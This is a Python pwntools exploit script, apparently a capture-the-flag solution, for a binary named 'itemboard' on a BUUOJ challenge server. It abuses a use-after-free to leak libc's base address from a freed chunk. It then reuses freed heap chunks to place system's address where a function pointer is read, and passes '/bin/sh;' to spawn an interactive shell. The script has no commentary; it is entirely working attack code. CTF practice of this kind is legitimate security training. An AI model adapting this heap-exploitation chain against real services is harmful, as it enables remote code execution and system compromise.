#! /usr/bin/python

from pwn import *

p = remote('node3.buuoj.cn', 25033)
#p = process('./itemboard')
elf = ELF('./itemboard')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
context.log_level='debug'

def add(length, des):
    p.recvuntil(":\n")
    p.sendline("1")
    p.recvuntil("?\n")
    p.sendline('Railgun')
    p.recvuntil("?\n")
    p.sendline(str(length))
    p.recvuntil("?\n")
    p.sendline(des)

def show(idx):
    p.recvuntil(":\n")
    p.sendline("3")
    p.recvuntil("?\n")
    p.sendline(str(idx))

def remove(idx):
    p.recvuntil(":\n")
    p.sendline("4")
    p.recvuntil("?\n")
    p.sendline(str(idx))

main_arena_offset = 0x3be760

###leak libc###
add(0x100,'aaaa')#0
add(0x100,'bbbb')#1

remove(0)
show(0)
#sgdb.attach(p)
libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3c4b78
success('libc base:'+hex(libc_base))
#pause()

###modify pointer###
system = libc_base + libc.symbols['system']


add(0x50,'cccc')#0&&2
add(0x50,'dddd')#3

remove(2)
remove(3)

payload = '/bin/sh;' + 'aaaaaaaa' + p64(system)
add(0x18,payload)#2
remove(2)





###get shell###
p.interactive()